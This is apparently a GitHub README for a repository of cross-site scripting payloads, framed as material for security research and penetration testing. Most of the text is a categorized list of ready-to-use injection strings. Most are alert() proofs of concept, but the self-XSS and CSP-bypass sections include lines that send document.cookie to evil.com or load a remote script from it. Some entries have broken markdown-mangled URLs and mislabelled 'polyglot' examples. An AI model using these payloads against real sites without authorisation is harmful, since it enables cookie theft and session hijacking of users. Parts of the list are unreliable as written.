<div align="center">

# 🚨 XSS Payloads Repository

A comprehensive collection of **Cross-Site Scripting (XSS)** payloads designed for educational research, security assessments, and penetration testing.

[![GitHub license](https://img.shields.io/badge/license-MIT-blue.svg)](LICENSE)
[![Security](https://img.shields.io/badge/security-offensive-red.svg)]()
[![Contributions Welcome](https://img.shields.io/badge/contributions-welcome-brightgreen.svg)]()

</div>

---

## 📌 About This Repository

This repository provides a robust, categorized repository of XSS payloads ranging from common injection vectors to advanced exploitation techniques. Security researchers, bug bounty hunters, and developers can utilize these payloads to test, identify, and mitigate XSS vulnerabilities effectively.

> **Disclaimer:** This repository is intended strictly for educational purposes, authorized security testing, and improving web application security postures. Unauthorized testing against systems you do not own or have explicit permission to test is strictly prohibited.

---

## 🧪 Types of XSS Payloads Covered

* **Reflected XSS:** Occurs when untrusted data is included in the immediate response without proper validation.
* **Stored XSS:** Occurs when malicious scripts are permanently stored on the server and executed when accessed.
* **DOM-Based XSS:** Exploits client-side JavaScript manipulation within the DOM.
* **Blind XSS:** Injects payloads in areas that execute later (e.g., admin panels, logs, support tickets).
* **Self XSS:** Exploits users tricked into executing malicious code in their own browser consoles.
* **Mutation XSS (mXSS):** Exploits HTML parsers that automatically modify injected payloads.
* **Polyglot XSS:** Uses hybrid payloads that execute across multiple contexts simultaneously.
* **Universal XSS (UXSS):** Exploits browser or plugin-level vulnerabilities rather than specific web apps.
* **Attribute-Based XSS:** Injects payloads directly into HTML attributes.
* **Cookie-Based XSS:** Exploits insecure cookie handling to deliver malicious scripts.
* **Post-Based XSS:** Exploits payloads delivered via HTTP POST requests.
* **JSON / JSONP XSS:** Injects malicious code into JSON responses or insecure JSONP endpoints.
* **WebSocket / XHR / AJAX XSS:** Exploits asynchronous data channels and real-time sockets.
* **CSP Bypass:** Techniques designed to bypass misconfigured Content Security Policies.
* **Alternative Contexts:** Includes SVG, PDF, Flash, Iframe, and Event Handler-based vectors.

---

## 📋 Quick Payload Reference

### 1. Reflected XSS
```html
<script>alert('XSS')</script>
"><script>alert('XSS')</script>
<img src=x onerror=alert('XSS')>
<svg onload=alert('XSS')>
<iframe src="javascript:alert('XSS')"></iframe>

## 2. Stored XSS

<script>alert('Stored XSS')</script>
<img src=x onerror=alert('Stored XSS')>
<svg onload=alert('Stored XSS')>
<marquee onstart="alert('Stored XSS')">Scroll me</marquee>

## 3. DOM-Based XSS

#<script>alert('DOM XSS')</script>
#<img src=x onerror=alert('DOM XSS')>
#"><img src=x onerror=alert('DOM XSS')>

## 4. Blind XSS

<script src=[https://your-burpcollaborator.com](https://your-burpcollaborator.com)></script>
"><img src=x onerror=this.src='[https://your-burpcollaborator.com](https://your-burpcollaborator.com)'>
"><svg onload="fetch('[https://your-burpcollaborator.com](https://your-burpcollaborator.com)')">

## 5. Self XSS

javascript:alert(document.cookie)
<img src=x onerror=alert(document.cookie)>
javascript:fetch('[https://evil.com?cookie='+document.cookie](https://evil.com?cookie='+document.cookie))

## 6. Mutation XSS (mXSS)

<img src=x oNerrOr=alert(1)>
<scr<script>ipt>alert(1)</script>
<b onmouseover=alert(1)>Hover me</b>

## 7. Polyglot XSS

'><script>alert('XSS')</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>


## 8. CSP Bypass Techniques


<script src="//[evil.com/xss.js](https://evil.com/xss.js)"></script>
<script>eval('alert(1)')</script>
<img src=x onerror=eval('ale'+'rt(1)')>
<svg><script>alert`1`</script></svg>


